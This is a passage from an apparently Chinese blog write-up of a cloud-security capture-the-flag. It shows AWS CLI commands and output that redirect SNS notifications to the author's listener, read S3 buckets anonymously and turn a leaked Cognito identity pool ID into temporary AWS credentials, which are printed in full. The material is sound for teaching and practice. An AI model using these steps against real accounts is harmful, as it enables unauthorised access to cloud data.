class="language-nix">  <span class="string">&quot;Type&quot;</span> : <span class="string">&quot;SubscriptionConfirmation&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;MessageId&quot;</span> : <span class="string">&quot;70543ea1-9a61-4d42-af5b-8dd26a1033a8&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;Token&quot;</span> : <span class="string">&quot;2336412f37fb687f5d51e6e2425a8a587301be38963ed30a1e8f0bba564ea18da841f4342638dfa32e49a2341fe1768b656d36f05377f620dca113dc93054f6e41b60e0d9b2ee1d955d7e1add9624692d05c4d504edc0137e984b03699e6095e2e483ef36c186b7ee4a4d41e5be6336dd51b4fd2e25eb4c9aa4090127283bd3a&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;TopicArn&quot;</span> : <span class="string">&quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;Message&quot;</span> : <span class="string">&quot;You have chosen to subscribe to the topic arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications.<span class="char escape_">\n</span>To confirm the subscription, visit the SubscribeURL included in this message.&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;SubscribeURL&quot;</span> : <span class="string">&quot;https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&amp;TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;Token=2336412f37fb687f5d51e6e2425a8a587301be38963ed30a1e8f0bba564ea18da841f4342638dfa32e49a2341fe1768b656d36f05377f620dca113dc93054f6e41b60e0d9b2ee1d955d7e1add9624692d05c4d504edc0137e984b03699e6095e2e483ef36c186b7ee4a4d41e5be6336dd51b4fd2e25eb4c9aa4090127283bd3a&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;Timestamp&quot;</span> : <span class="string">&quot;2025-03-18T02:17:50.154Z&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;SignatureVersion&quot;</span> : <span class="string">&quot;1&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;Signature&quot;</span> : <span class="string">&quot;mCpeKpF3RFXG9V7KJHnGJBCT0kPGQLEGvvsGpLJ0bsOjvJ8CFHWPDnlbRVpH2c8eH58LkaLM+BmowQbQuiL3XZ99YBycczwBgUL/HXMmB+r3k/EFoxpBE0TxBJ8CgU6ufxurhLHe/R9saqEMIuGSdnG6ksgE+OEBOQJBpKAO+nc7NNkVXR3zcViejHgZ0xz16fgBaa2pEu4wtNMfuhMOFfAKoRfLnen8znEoXNTYkq8jb0F+bF7ar1gPUnG0Wk88wyN/v7cuQZDlZUcdTd4faSgzh9BCXH3fRk8cmmSVPrJrHHWlybmM0tlwHhYu/8uEmRK4ZMlzOUzJCLxDU182og==&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;SigningCertURL&quot;</span> : <span class="string">&quot;https://sns.us-east-1.amazonaws.com/SimpleNotificationService-9c6465fa7f48f5cacd23014631ec1136.pem&quot;</span></span></span><br><span class="line"><span class="language-nix">&#125;</span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="operator">-</span>--------------------------------------------------------------------------------------<span class="operator">//</span>第二次监听</span></span><br><span class="line"><span class="language-nix">Connection received on <span class="number">15.221</span>.<span class="number">160.27</span> <span class="number">20081</span></span></span><br><span class="line"><span class="language-nix">POST <span class="operator">/</span>@tbic.wiz.io HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">x-amz-sns-message-type:</span> Notification</span></span><br><span class="line"><span class="language-nix"><span class="params">x-amz-sns-message-id:</span> f93fdce7-cfeb-<span class="number">562</span>e-<span class="number">958</span>c-bcb51573bfbe</span></span><br><span class="line"><span class="language-nix"><span class="params">x-amz-sns-topic-arn:</span> arn:aws:sns:us-east-<span class="number">1</span>:<span class="number">092297851374</span>:TBICWizPushNotifications</span></span><br><span class="line"><span class="language-nix"><span class="params">x-amz-sns-subscription-arn:</span> arn:aws:sns:us-east-<span class="number">1</span>:<span class="number">092297851374</span>:TBICWizPushNotifications:eab62e53-<span class="number">945</span>5-<span class="number">42</span>b8-<span class="number">856</span>2-cf693e71cdf5</span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> text<span class="symbol">/plain</span>; <span class="attr">charset</span><span class="operator">=</span>UTF-<span class="number">8</span></span></span><br><span class="line"><span class="language-nix"><span class="params">X-Amzn-Trace-Id:</span> Root<span class="operator">=</span><span class="number">1</span><span class="operator">-</span><span class="number">67</span>d8d858-<span class="number">7</span>cc381b1656cadce24dea9b2;<span class="attr">Parent</span><span class="operator">=</span><span class="number">09</span>c8265488a27a54;<span class="attr">Sampled</span><span class="operator">=</span><span class="number">0</span>;<span class="attr">Lineage</span><span class="operator">=</span><span class="number">1</span>:<span class="number">36680206</span>:<span class="number">0</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Length:</span> <span class="number">963</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> <span class="number">101.42</span>.<span class="number">13.105</span>:<span class="number">2333</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Connection:</span> Keep-Alive</span></span><br><span class="line"><span class="language-nix"><span class="params">User-Agent:</span> Amazon Simple Notification Service Agent</span></span><br><span class="line"><span class="language-nix"><span class="params">Accept-Encoding:</span> gzip,deflate</span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">&#123;</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;Type&quot;</span> : <span class="string">&quot;Notification&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;MessageId&quot;</span> : <span class="string">&quot;f93fdce7-cfeb-562e-958c-bcb51573bfbe&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;TopicArn&quot;</span> : <span class="string">&quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;Message&quot;</span> : <span class="string">&quot;&#123;wiz:always-suspect-asterisks&#125;&quot;</span>,   <span class="symbol">//flag</span></span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;Timestamp&quot;</span> : <span class="string">&quot;2025-03-18T02:20:08.419Z&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;SignatureVersion&quot;</span> : <span class="string">&quot;1&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;Signature&quot;</span> : <span class="string">&quot;KCSfiV2HOjSSmpQ5m/CcOidBP97QRlmMAEesSK8FBa5zdHNKp0llKcjpeoJ5cHItV2VfVaAcIs+wSMjA9N8M1bkpv9SMWC0o33yYDUYYkvwAuisTB5z57I3Y12Qbc9zAjEel3lRmPSwJEP1jZTSNaD6MPfH54QOWfiazNAAtMxqWF+9qa0oXTbDgTn47vHbAN2Ef2IsgkWyOYQl2mwLLuiIJJKN0P3Yt019okzdzgIiGtn/iVbLfHYzQgeBvB7jlgMgp5wi0ZDmL8GfY/Qp3JgGT3ZPecW9RZsa421pAOlkZoyeOFgUDIXmgPuEVwXvOVi+O9eqs1SChS0INfZfcQQ==&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;SigningCertURL&quot;</span> : <span class="string">&quot;https://sns.us-east-1.amazonaws.com/SimpleNotificationService-9c6465fa7f48f5cacd23014631ec1136.pem&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;UnsubscribeURL&quot;</span> : <span class="string">&quot;https://sns.us-east-1.amazonaws.com/?Action=Unsubscribe&amp;SubscriptionArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:eab62e53-9455-42b8-8562-cf693e71cdf5&quot;</span></span></span><br><span class="line"><span class="language-nix">&#125;</span></span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;Message&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;&#123;wiz:always-suspect-asterisks&#125;&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="Admin-only"><a href="#Admin-only" class="headerlink" title="Admin only?"></a>Admin only?</h4><p>也是一个<code>s3</code>存储桶的<code>IAM</code>策略</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;s3:prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;files/*&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ForAllValues:StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;aws:PrincipalArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::133713371337:user/admin&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>首先尝试列出<code>files/</code>下的文件看看都有哪些，结果权限不足<code>Access Denied</code></p>
<p>根据给出的<code>IAM</code>策略可知<code>ListBucket</code>需要同时满足前缀为<code>files/</code>和请求者为<code>admin</code>用户这两个条件</p>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="string">aws</span> <span class="string">s3api</span> <span class="built_in">list-objects</span> <span class="built_in">--bucket</span> <span class="string">thebigiamchallenge-admin-storage-abf1321</span> <span class="built_in">--prefix</span> <span class="string">files</span>/</span><br><span class="line"></span><br><span class="line"><span class="string">An</span> <span class="string">error</span> <span class="string">occurred</span> (<span class="string">AccessDenied</span>) <span class="string">when</span> <span class="string">calling</span> <span class="string">the</span> <span class="string">ListObjects</span> <span class="string">operation</span>: <span class="string">Access</span> <span class="string">Denied</span></span><br></pre></td></tr></table></figure>

<p>由于这条策略，所以可以采取匿名访问，不需要进行签名</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws s3 ls s3://thebigiamchallenge-<span class="keyword">admin</span>-<span class="keyword">storage</span>-abf1321/files/ <span class="comment">--no-sign-request</span></span><br><span class="line"><span class="number">2023</span><span class="number">-06</span><span class="number">-07</span> <span class="number">19</span>:<span class="number">15</span>:<span class="number">43</span>         <span class="number">42</span> flag-<span class="keyword">as</span>-<span class="keyword">admin</span>.txt</span><br><span class="line"><span class="number">2023</span><span class="number">-06</span><span class="number">-08</span> <span class="number">19</span>:<span class="number">20</span>:<span class="number">01</span>      <span class="number">81889</span> logo-<span class="keyword">admin</span>.png</span><br></pre></td></tr></table></figure>

<p>拿到了<code>Key</code>信息，直接使用<code>get-object</code>下载访问即可</p>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="string">aws</span> <span class="string">s3api</span> <span class="built_in">get-object</span> <span class="built_in">--bucket</span> <span class="string">thebigiamchallenge-admin-storage-abf1321</span> <span class="built_in">--key</span> <span class="string">files</span>/<span class="string">flag-as-admin</span>.<span class="string">txt</span> /<span class="string">tmp</span>/<span class="string">flag-as-admin</span>.<span class="string">txt</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;AcceptRanges&quot;</span>: <span class="string">&quot;bytes&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LastModified&quot;</span>: <span class="string">&quot;Wed, 07 Jun 2023 19:15:43 GMT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ContentLength&quot;</span>: <span class="string">42</span>,</span><br><span class="line">    <span class="string">&quot;ETag&quot;</span>: <span class="string">&quot;\&quot;</span><span class="string">e365cfa7365164c05d7a9c209c4d8514</span>\<span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ContentType&quot;</span>: <span class="string">&quot;text/plain&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ServerSideEncryption&quot;</span>: <span class="string">&quot;AES256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Metadata&quot;</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt; <span class="string">cat</span> /<span class="string">tmp</span>/<span class="string">flag-as-admin</span>.<span class="string">txt</span></span><br><span class="line">&#123;<span class="string">wiz:principal-</span><span class="string">arn-is-not-what-you-think</span>&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Do-I-Know-You"><a href="#Do-I-Know-You" class="headerlink" title="Do I Know You?"></a>Do I Know You?</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VisualEditor0&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;mobileanalytics:PutEvents&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;cognito-sync:*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VisualEditor1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;s3:ListBucket&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:s3:::wiz-privatefiles&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:s3:::wiz-privatefiles/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>根据策略，题目使用了<code>AWS-Cognito</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.AWS-Cognito是什么？</span><br><span class="line">AWS Cognito 是亚马逊云服务（AWS）提供的一项服务，它帮助开发者轻松地为应用程序添加用户认证、授权和用户管理功能。简单来说，Cognito 让你可以安全地管理用户的登录和访问权限，而不需要你自己从头构建这些复杂的系统。</span><br><span class="line"></span><br><span class="line">2.AWS-Cognito的工作原理</span><br><span class="line">要使用 Cognito 需要先创建一个 Amazon Cognito 身份池，然后填入创建的身份池 ID 去调用 SDK 获取临时凭证，最后通过临时凭证去操作资源。</span><br></pre></td></tr></table></figure>

<p>题目前端源代码中泄露了身份池<code>identityPoolId</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">region</span> = <span class="string">&#x27;us-east-1&#x27;</span>;</span><br><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">credentials</span> = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title class_">CognitoIdentityCredentials</span>(&#123;<span class="title class_">IdentityPoolId</span>: <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>利用<code>identityPoolId</code>获取认证<code>IdentityId</code></p>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="string">aws</span> <span class="string">cognito-identity</span> <span class="built_in">get-id</span> <span class="built_in">--identity-pool-id</span> <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span> <span class="built_in">--region</span> <span class="string">us-east-1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;IdentityId&quot;</span>: <span class="string">&quot;us-east-1:157d6171-ee0d-ce2e-eb5a-c253be74469b&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用<code>IdentityId</code>生成临时凭据</p>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="string">aws</span> <span class="string">cognito-identity</span> <span class="built_in">get-credentials-for-identity</span> <span class="built_in">--identity-id</span> <span class="string">&quot;us-east-1:157d6171-ee0d-ce2e-eb5a-c253be74469b&quot;</span> <span class="built_in">--region</span> <span class="string">us-east-1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;IdentityId&quot;</span>: <span class="string">&quot;us-east-1:157d6171-ee0d-ce2e-eb5a-c253be74469b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Credentials&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;AccessKeyId&quot;</span>: <span class="string">&quot;ASIARK7LBOHXIDFCUV2R&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SecretKey&quot;</span>: <span class="string">&quot;MZ0ZYi2TN06i0OuRH1BHxnEwgTC8x7Ks/NuOhdiI&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SessionToken&quot;</span>: <span class="string">&quot;IQoJb3JpZ2luX2VjEP7//////////wEaCXVzLWVhc3QtMSJHMEUCIQDv+NiS1xjPDb3ZesdcomqQLsUrNRZNsQRwKFe1vKdrPwIgfT3CxKN3QYMnDt7hdteTuHcjQXT78yiP</span></span><br><span class="line"><span class="string">x2b+G2qn57kqsAUIVxAAGgwwOTIyOTc4NTEzNzQiDJCKENpfeDM13ViAGyqNBQII5YFXCpKvcI0YX1E3Z3Eo2mtw/IHYbpw6Rb6kHUnFQYoRkSCAwTJSEdnd3hkCUj2ODtO/mirpOgGPO1W8moHPlho8SzC9n</span></span><br><span class="line"><span class="string">nKQiqI2ctZGn86BJFQws3Vr7btNC6aeFXHD7etHcJuzz39h2/89nk9k9NIqAmPqdff0wNlX80tHbn91Oce55/MX/78UIvs1TPM6FoCW80Mv2oGBA3085KiLv1M6O80+Xrc3Gg0rj3/XlkCLkbVzn/bd8V6uIO</span></span><br><span class="line"><span class="string">hOEn8uNQVNQKzn+bfZ/DOk7Hl6fq1UtIQhBYfmkrMTAhap0DDa8+CC7WSJzObJRLkZZtGSOdX4uwnyn5PR+Ojd7H0u85QXjDrBSGdFQgb7TjECoAnUMrczfR2tsWbXCNEmkyXQZjqHSGTceUzDqrhrXySd+mC</span></span><br><span class="line"><span class="string">317Fa69k8KkSPTKHt1A2KZP10jK3FnsKzwcqZKw+5alSYnA6wUE/IY6J/uAZXsKnyiI9GHlcC2PMaWjRu1/7vWZ0qJ656lzZjvf/K5qxsfIf6oI+fpGsmpA9k4uWe5ACHHjbIbxph7MTAiE15nIpim3y1Sdzb</span></span><br><span class="line"><span class="string">dEbC+ACk+uZEyKnlXp6noYE9fuM2yYZpDVCLCkL/JtJrZwG1SAowjEwP6sj0OAnABfJnT7I03IEcdWge95sOjRkWNWrmzThDUDzA9k6Znr67rP/ICqI9v1oQA8D9VwytnpZK2u7kIYrbqLhvn555JBCBaVtPG</span></span><br><span class="line"><span class="string">AhD1V8Msl1VcrdQ9fj+IOSxbti1qZBFZloIO/PPn+ztblkaIdTnO+0lnvKafYEklcN5RzH91GWvX6xnGMM9JBadWc3OFU4MzLboZtWy8GMOZnGTTPRe1LP09wzHIkOPR5BK2rZSjRe/DCV5ikp+MLOO5L4GOt</span></span><br><span class="line"><span class="string">4CobqYf0sexNtUTPjd54otUHJRMtP2twz0cGj9+iFMAlLlm5qlDoYNUHDEI5pBKMzzAf0FAs45RrtRVdB59eJtmCjiS+KN0xGqEublAheXMjN7zCvfw+Yedpen24V7WJ+6nLElWTpi3psgnrhv1WaN6fUsQfz</span></span><br><span class="line"><span class="string">Kb9s+WRATClg/CDPQ5W0QQ0gpOJ9nzbAjXZkoqRT1k+XJBf8inu7tH4zGS5OhQ2LF9IqngkVsUH3A26Ay9nIrVnOjrP35NIajqnOIVTrCL94CDBmCqDRzs7Fa8WPhsYKgdTDI2WXMvOQqrcT1dgMZIJYF7NSw</span></span><br><span class="line"><span class="string">m9sRERYESoxUbpOXQTAs5ShpMa3A7eVTpCol8imAiJApGNo5tx7aOHrs4pFp6IKlgZg+FawRioATp9S4oahLhV3BpfSmMAZnXZrDcick8OD3biPZSI4znsKols+bKQbNPXPJXZwjVcbAnyXxGHG2EPJVwLo=&quot;</span></span><br><span class="line">,</span><br><span class="line">        <span class="string">&quot;Expiration&quot;</span>: <span class="string">1742280003</span>.<span class="string">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后可以使用临时凭证访问桶中数据信息，为此可以写一个<code>HTML</code>脚本来生成预签名<code>URL</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Cognito JavaScript SDK Example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">region</span> = <span class="string">&#x27;us-east-1&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable constant_">AWS</span>.<span 